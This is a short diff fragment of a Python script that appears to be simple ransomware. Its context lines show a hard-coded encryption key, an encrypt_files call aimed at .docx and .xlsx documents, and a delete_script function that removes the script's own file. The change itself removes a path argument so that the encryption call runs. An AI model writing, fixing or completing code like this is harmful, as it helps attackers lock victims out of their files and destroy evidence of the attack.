@@ -19,10 +19,13 @@ def encrypt_files(key, extension):
 
 key = b'gQHAjOvQ8tUkqHqrfwXs8uVwdsgLmItRH4JZ2xz18l0='
 
-path = r''
 extension = ('.docx', '.xlsx')
 
-encrypt_files(path, key, extension)
+encrypt_files(key, extension)
+
+
+
+
 
 def delete_script():
     os.remove(__file__)
